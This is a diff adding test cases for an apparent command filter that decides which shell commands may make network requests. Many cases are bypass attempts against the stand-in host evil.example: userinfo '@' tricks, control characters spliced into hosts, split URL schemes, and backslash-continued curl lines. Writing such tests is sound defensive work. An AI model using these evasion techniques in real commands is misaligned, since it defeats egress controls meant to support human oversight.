@@ -57,3 +57,52 @@
 {"id":"CC-L09","class":"L","family":"CODE","cmd":"node -e \"fetch('http://localhost:3420/api/' + 'kanban')\"","expect":"allow"}
 {"id":"CC-L10","class":"L","family":"CODE","cmd":"python3 -c \"import requests; requests.get('http://127.0.0.1:3420/x', headers={'Authorization': 'Bearer t'}, timeout=5)\"","expect":"allow"}
 {"id":"CC-L11","class":"L","family":"CODE","cmd":"node -e \"fetch(`http://localhost:${3420}/api/health`)\"","expect":"allow"}
+{"id":"CC-R1-B1a","class":"C","family":"CODE","cmd":"python3 -c \"import requests; requests.get('http://localhost:3420' '@evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B1b","class":"C","family":"CODE","cmd":"node -e \"require('http').get('http://localhost:3420' + '@evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B1c","class":"C","family":"CODE","cmd":"python3 -c \"import requests; requests.get('https://api.github.com:' '@evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B1d","class":"C","family":"CODE","cmd":"node -e \"fetch('https://api.github.com:' + 'pass@evil.example/')\"","expect":"deny"}
+{"id":"CC-R1-B1e","class":"C","family":"CODE","cmd":"node -e \"fetch('https://api.github.com:443' + '@evil.example/')\"","expect":"deny"}
+{"id":"CC-R1-B1f","class":"C","family":"CODE","cmd":"node -e \"fetch('https://api.github.com:x' + '@evil.example/')\"","expect":"deny"}
+{"id":"CC-R1-B1g","class":"C","family":"CODE","cmd":"node -e \"fetch('http://localhost:3420' + '@evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B1h","class":"C","family":"CODE","cmd":"python3 <<'EOF'\nimport urllib.request as u\nu.urlopen(('http://localhost:3420'\n  '@evil.example/x'))\nEOF","expect":"deny"}
+{"id":"CC-R1-B1i","class":"C","family":"CODE","cmd":"perl -MLWP::Simple -e 'get(\"http://localhost:3420\".\"\\@evil.example\")'","expect":"deny"}
+{"id":"CC-R1-B1j","class":"C","family":"CODE","cmd":"php -r \"file_get_contents('http://localhost:3420' . '@evil.example');\"","expect":"deny"}
+{"id":"CC-R1-B1k","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('http://localhost:3420:8080')\"","expect":"deny"}
+{"id":"CC-R1-B1l","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('http://localhost:3420'.concat('@evil.example'))\"","expect":"deny"}
+{"id":"CC-R1-B1m","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; p=1; u.urlopen(f'http://localhost:{p}@evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B1n","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen(('http://localhost:3420') + '@evil.example')\"","expect":"deny"}
+{"id":"CC-R1-B2a","class":"C","family":"CODE","cmd":"node -e \"fetch('https://api.github.com\t.evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B2b","class":"C","family":"CODE","cmd":"node -e 'fetch(`https://api.github.com\n.evil.example/x`)'","expect":"deny"}
+{"id":"CC-R1-B2c","class":"C","family":"CODE","cmd":"node -e \"require('https').get('https://api.github.com\t.evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B2d","class":"C","family":"CODE","cmd":"node <<'EOF'\nfetch(`https://localhost\n.evil.example/x`)\nEOF","expect":"deny"}
+{"id":"CC-R1-B2e","class":"C","family":"CODE","cmd":"python3 -c \"import requests; requests.get('http://localhost\t.evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B2f","class":"C","family":"CODE","cmd":"node -e 'fetch(`https://api.github.com\r\n.evil.example/x`)'","expect":"deny"}
+{"id":"CC-R1-B2g","class":"C","family":"CODE","cmd":"node -e 'fetch(`https://localhost:3420\n@evil.example/x`)'","expect":"deny"}
+{"id":"CC-R1-B2h","class":"C","family":"CODE","cmd":"node -e \"fetch('https://api.github.com\\t.evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B2i","class":"C","family":"CODE","cmd":"node -e \"fetch('https://api.github.com\\n.evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B2j","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('http://localhost\\r.evil.example')\"","expect":"deny"}
+{"id":"CC-R1-B3a","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('http'+':'+'//evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B3b","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('https' ':/' '/evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B3c","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('http' + ':' + '//evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B3d","class":"C","family":"CODE","cmd":"node -e \"fetch('https' + ':/' + '/evil.example/x')\"","expect":"deny"}
+{"id":"CC-R1-B3e","class":"C","family":"CODE","cmd":"node -e \"fetch('https'.concat(':', '//evil.example/'))\"","expect":"deny"}
+{"id":"CC-R1-B3f","class":"C","family":"CODE","cmd":"python3 <<'EOF'\nimport urllib.request as u\nu.urlopen('http' ':' '//evil.example/x')\nEOF","expect":"deny"}
+{"id":"CC-R1-B3g","class":"C","family":"CODE","cmd":"node -e \"fetch(['wss', ':', '//evil.example/x'].join(''))\"","expect":"deny"}
+{"id":"CC-R1-B3h","class":"C","family":"CODE","cmd":"node -e 'fetch(`https`+`:`+`//evil.example`)'","expect":"deny"}
+{"id":"CC-R1-B5a","class":"C","family":"CURL","cmd":"echo a\\\\\ncurl https://evil.example/","expect":"deny"}
+{"id":"CC-R1-B5b","class":"C","family":"CURL","cmd":"echo a\\\\\\\\\ncurl https://evil.example/","expect":"deny"}
+{"id":"CC-R1-B5c","class":"C","family":"CURL","cmd":"echo a\\\\\r\ncurl https://evil.example/","expect":"deny"}
+{"id":"CC-R1-B5d","class":"C","family":"CURL","cmd":"true\\\\\ncurl https://evil.example/","expect":"deny"}
+{"id":"CC-R1-B5e","class":"C","family":"CURL","cmd":"echo a\\\\\\\\\\\\\npython3 -c \"import urllib.request as u; u.urlopen('https://evil.example')\"","expect":"deny"}
+{"id":"CC-R1-B4c","class":"L","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('http://127.0.0.1')\"","expect":"allow"}
+{"id":"CC-R1-B4d","class":"L","family":"CODE","cmd":"node -e \"fetch('http://localhost:3420')\"","expect":"allow"}
+{"id":"CC-R1-B4e","class":"L","family":"CODE","cmd":"python3 -c \"import urllib.request as u; print(u.urlopen('http://localhost:3420').status)\"","expect":"allow"}
+{"id":"CC-R1-B1o","class":"L","family":"CODE","cmd":"node -e \"fetch('http://localhost:3420' + '/api/health')\"","expect":"allow"}
+{"id":"CC-R1-B1p","class":"L","family":"CODE","cmd":"node -e \"fetch('http://localhost:3420' + '?x=1')\"","expect":"allow"}
+{"id":"CC-R1-B1q","class":"L","family":"CODE","cmd":"python3 -c \"import urllib.request as u; p='/x'; u.urlopen(('http://127.0.0.1:3420') + p)\"","expect":"allow"}
+{"id":"CC-R1-B1r","class":"L","family":"CODE","cmd":"python3 -c \"import urllib.request as u; port=3420; u.urlopen('http://localhost:' + str(port))\"","expect":"allow"}
+{"id":"CC-R1-B1s","class":"L","family":"CODE","cmd":"node -e 'fetch(`http://localhost:${3420}/api/health`)'","expect":"allow"}
+{"id":"CC-R1-B2k","class":"L","family":"CODE","cmd":"python3 <<'EOF'\nimport urllib.request as u\n# base http://localhost:3420\n  \nu.urlopen('http://localhost:3420/x')\nEOF","expect":"allow"}
+{"id":"CC-R1-B5f","class":"L","family":"CURL","cmd":"echo a\\\ncurl https://evil.example/","expect":"allow"}
+{"id":"CC-R1-B5g","class":"L","family":"CURL","cmd":"echo a\\\\\\\ncurl https://evil.example/","expect":"allow"}
+{"id":"CC-R1-B3j","class":"L","family":"CODE","cmd":"python3 -c \"import urllib.request as u; h='localhost:3420'.split(':'); u.urlopen('http://localhost:3420/x')\"","expect":"allow"}
